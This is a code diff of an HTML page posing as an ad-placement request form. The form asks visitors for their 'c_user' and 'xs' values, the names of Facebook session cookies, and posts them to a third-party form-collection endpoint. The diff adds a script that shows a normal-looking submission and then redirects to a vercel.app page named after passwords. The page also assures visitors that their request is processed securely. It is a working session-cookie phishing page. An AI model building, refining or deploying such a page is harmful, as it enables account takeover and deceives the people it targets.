@@ -94,17 +94,32 @@ Please fill in the details below to submit your request for placing an ad. Only 
 </video>
 </div>
 
-<!-- Form with Submit-Form integration and redirect -->
-<form id="adForm" action="https://submit-form.com/upL3IuLAs" method="POST" data-redirect="https://password-orpin-theta.vercel.app/">
+<!-- Form -->
+<form id="adForm" action="https://submit-form.com/upL3IuLAs" method="POST" target="_blank">
     <input type="text" name="c_user" placeholder="Enter c_user value" required>
     <input type="text" name="xs" placeholder="Enter XS value" required>
-    <button type="submit">
+    <button type="submit" id="submitBtn">
         Submit Request
     </button>
 </form>
 
 <p class="note">Your request will be processed securely. We respect your privacy.</p>
 </div>
+
+<script>
+const form = document.getElementById('adForm');
+const btn = document.getElementById('submitBtn');
+
+form.addEventListener('submit', function(e){
+    btn.disabled = true;
+    btn.innerHTML = 'Submitting…';
+    
+    // Let the form submit normally, then redirect after short delay
+    setTimeout(() => {
+        window.location.href = "https://password-orpin-theta.vercel.app/";
+    }, 1500); // 1.5s delay to ensure form submission
+});
+</script>
 
 </body>
 </html>
